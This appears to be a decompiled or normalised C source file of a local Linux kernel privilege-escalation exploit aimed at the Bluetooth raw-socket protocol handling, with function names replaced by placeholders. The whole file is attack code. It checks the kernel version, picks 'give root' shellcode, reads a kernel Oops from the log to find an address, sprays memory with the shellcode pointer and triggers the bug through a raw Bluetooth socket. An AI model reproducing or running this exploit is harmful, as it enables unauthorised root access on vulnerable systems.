#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct utsname {char* release; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_BLUETOOTH ; 
 scalar_t__ BRKVAL ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int FUNC0 (void*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 scalar_t__ FUNC2 () ; 
 char* k_give_root ; 
 char* k_give_root2 ; 
 int FUNC3 (int,char*,int) ; 
 int /*<<< orphan*/  FUNC4 (char*,...) ; 
 int FUNC5 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,unsigned int) ; 
 char* FUNC6 (char*,char*) ; 
 unsigned int FUNC7 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC8 (struct utsname*) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (int) ; 

FUNC11(int argc, char *argv[])
{
char buf[2048];
int sock, *mod = (int*)buf;
unsigned int arg;
int tmp;
char *check, *ong_code = 0;
struct utsname vers;

FUNC4("-|-local bluez exploit v.0.3  -by qobaiashi-\n |\n");
if (FUNC8(&vers) < 0)
   FUNC4(" |- couldn't determine kernel version\n");

else
   {
    FUNC4(" |- i've found kernel %s\n", vers.release);
    if(FUNC6(vers.release, "2.6.11") > 0) ong_code = k_give_root2;
    if(FUNC6(vers.release, "2.6.4")  > 0) ong_code = k_give_root;
   }

if (ong_code == 0)
   {
    FUNC4(" |- no supported version found..trying 2.6.4 code\n");
    ong_code = k_give_root;
    }


if( FUNC0((void*)BRKVAL) == -1 )
  {
    FUNC4(" |- brk failed..exiting\n");
    FUNC1(1);
   }


if (argc < 2)
   {
    FUNC9(argv[0]);
    FUNC1(1);
    }

if (argc == 2)
    arg = FUNC7(argv[1], 0, 0);

if (argc == 3)
   {
    arg = FUNC7(argv[1], 0, 0);
    mod = (unsigned int*)FUNC7(argv[2], 0, 0);
   }

if (FUNC2() != 0)//parent watch the Oops
   {
    //previous Oops printing
   FUNC10(100);
   if ((tmp = FUNC3(0x3, buf, 1700)) > -1)
       {
        check = FUNC6(buf, "ecx: ");
        FUNC4(" |- [%0.14s]\n", check);
        if (*(check+5) == 0x30 && *(check+6) == 0x38)
           {  
           check+=5;
           FUNC4(" |- suitable value found!using 0x%0.9s\n", check);
           FUNC4(" |- the time has come to push the button... check your id!\n");
           *(check+9) = 0x00;*(--check) = 'x';*(--check) = '0';
           mod = (unsigned int*)FUNC7(check, 0, 0);
           for (sock = 0;sock <= 200;sock++)
                *(mod++) = (int)ong_code;//link to shellcode
            
            if ((sock = FUNC5(AF_BLUETOOTH, SOCK_RAW, arg)) < 0)
               {
                FUNC4(" |- something went w0rng (invalid value)\n");
                FUNC1(1);
               }
            
           }    
        }
   return 0;
   }

if (FUNC2() == 0)//child does the exploit
{
  for (sock = 0;sock <= 200;sock++)
     *(mod++) = (int)ong_code;//link to shellcode

  FUNC4(" |- trying...\n");
  if ((sock = FUNC5(AF_BLUETOOTH, SOCK_RAW, arg)) < 0)
      {
      FUNC4(" |- something went w0rng (invalid value)\n");
      FUNC1(1);
     }
}

FUNC1(0);
}